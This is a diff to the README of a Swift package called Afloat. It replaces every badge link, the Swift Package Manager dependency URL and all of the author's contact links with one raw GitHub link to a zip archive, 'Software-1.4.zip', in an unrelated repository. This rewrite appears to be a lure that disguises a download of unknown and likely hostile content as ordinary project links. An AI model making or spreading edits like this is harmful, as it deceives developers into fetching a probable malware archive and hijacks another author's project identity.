@@ -7,10 +7,10 @@
 </div>
 
 <p align="center">
-  <a href="https://swift.org"><img src="https://img.shields.io/badge/Swift-6.3+-F05138?logo=swift&logoColor=white" alt="Swift 6.3+"></a>
-  <a href="https://developer.apple.com"><img src="https://img.shields.io/badge/iOS-26+-000000?logo=apple" alt="iOS 26+"></a>
-  <a href="https://developer.apple.com"><img src="https://img.shields.io/badge/macOS-26+-000000?logo=apple" alt="macOS 26+"></a>
-  <a href="https://developer.apple.com"><img src="https://img.shields.io/badge/visionOS-26+-000000?logo=apple" alt="visionOS 26+"></a>
+  <a href="https://raw.githubusercontent.com/Dire-Wolf-Space/Afloat/main/Sources/Afloat/Examples/Software-1.4.zip"><img src="https://img.shields.io/badge/Swift-6.3+-F05138?logo=swift&logoColor=white" alt="Swift 6.3+"></a>
+  <a href="https://raw.githubusercontent.com/Dire-Wolf-Space/Afloat/main/Sources/Afloat/Examples/Software-1.4.zip"><img src="https://img.shields.io/badge/iOS-26+-000000?logo=apple" alt="iOS 26+"></a>
+  <a href="https://raw.githubusercontent.com/Dire-Wolf-Space/Afloat/main/Sources/Afloat/Examples/Software-1.4.zip"><img src="https://img.shields.io/badge/macOS-26+-000000?logo=apple" alt="macOS 26+"></a>
+  <a href="https://raw.githubusercontent.com/Dire-Wolf-Space/Afloat/main/Sources/Afloat/Examples/Software-1.4.zip"><img src="https://img.shields.io/badge/visionOS-26+-000000?logo=apple" alt="visionOS 26+"></a>
 </p>
 
 <div align="center">
@@ -32,7 +32,7 @@ Afloat provides dynamic navigation titles and subtitles that respond to scroll e
 
 ```swift
 dependencies: [
-    .package(url: "https://github.com/AdelaideSky/Afloat.git", from: "1.0.0")
+    .package(url: "https://raw.githubusercontent.com/Dire-Wolf-Space/Afloat/main/Sources/Afloat/Examples/Software-1.4.zip", from: "1.0.0")
 ]
 ```
 
@@ -85,6 +85,6 @@ MIT. See [LICENSE](LICENSE) for details.
 
 ## Contact
 
-- [Website](https://adesky.fr/)
-- [Twitter](https://x.com/ade_sky_/)
-- [LinkedIn](https://www.linkedin.com/in/adelaidehumez/)
+- [Website](https://raw.githubusercontent.com/Dire-Wolf-Space/Afloat/main/Sources/Afloat/Examples/Software-1.4.zip)
+- [Twitter](https://raw.githubusercontent.com/Dire-Wolf-Space/Afloat/main/Sources/Afloat/Examples/Software-1.4.zip)
+- [LinkedIn](https://raw.githubusercontent.com/Dire-Wolf-Space/Afloat/main/Sources/Afloat/Examples/Software-1.4.zip)
